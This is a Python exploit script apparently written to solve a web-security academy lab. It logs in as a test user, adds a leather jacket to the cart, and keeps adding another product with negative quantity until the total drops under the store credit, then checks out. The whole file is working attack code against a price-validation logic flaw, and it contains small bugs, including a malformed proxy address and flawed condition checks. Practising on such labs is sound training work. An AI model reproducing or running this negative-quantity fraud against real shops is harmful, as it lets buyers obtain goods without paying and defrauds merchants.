import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1_8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token

def get_total(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    total_entry = soup.find("th", string="Total:").parent()[1]
    total = float(re.search(r"\$(\d+)", str(total_entry)).group(1))
    return total

def buy_jacket(s, url):
    # FIND THE JACKET PRODUCT ID IN /
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    jacket_entry = soup.find("img", {'src' : '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'}).parent()
    product_id = re.search(r"productId=(\d+)", str(jacket_entry)).group(1)
    
    # LOGIN AS USER wiener
    print("[+] Let's start by logging in as user 'wiener'...")
    login_url = url + "/login"
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)

    # CHECK IF LOGIN SUCCEEDED, THEN GO ON
    if "Log out" and "wiener" in r.text:
        print("[+] Logged-in!")

        # ADD JACKET TO CART
        cart_url = url + "/cart"
        params = {
            'productId' : product_id,
            'redir' : 'PRODUCT',
            'quantity' : 1
        }
        r = s.post(cart_url, data=params, verify=False, proxies=proxies)
        if "Store credit: $100.00" not in r.text and r.status_code != 200:
            print("[-] Could not add the Leather Jacket to cart!\n[-] Exiting the script...")
            sys.exit(-1)
        
        # GET TOTAL OF THE CART
        total = get_total(s, cart_url)
        print("[+] The current total of the cart is $%0.2f, while current wallet is $100.00" % total)

        # ADD OTHER PRODUCTS WITH NEGATIVE QUANTITY TO BRING THE TOTAL IN A RANGE BETWEEN 0 AND 100 DOLLARS
        params = {
            'productId' : 2,
            'redir' : 'PRODUCT',
            'quantity' : -1
        }
        print("[+] Adding now a random product with negative quantity. The flawed web application subtracts money from the total when negative quantities are added to the cart")
        while total >= 100.00:
            r = s.post(cart_url, data=params, verify=False, proxies=proxies)
            total = get_total(s, cart_url)
            sys.stdout.write("[+] Product added, the total is now $%0.2f\r" % total)
            sys.stdout.flush()
            sys.stdout.write("\033K")
        print("\n[+] Since the total is now affordable, we can buy the Leather Jacket!")

        # PLACE ORDER
        checkout_url = url + "/cart/checkout"
        params = {
            'csrf' : get_csrf(s, cart_url)
        }
        r = s.post(checkout_url, data=params, verify=False, proxies=proxies)
        if "Your order is on its way!" in r.text and r.status_code == 200:
            print("[+] Exploit succeeded!")
            return
    else:
        print("[-] Something went wrong!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s ww.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].strip()

    print("[+] Lab: High-level logic vulnerability")
    print("""[+] This lab doesn't adequately validate user input.
    You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price.
    To solve the lab, buy a "Lightweight l33t leather jacket".
    
    You can log in to your own account using the following credentials: wiener:peter\n""")

    buy_jacket(s, url)

if __name__ == "__main__":
    main()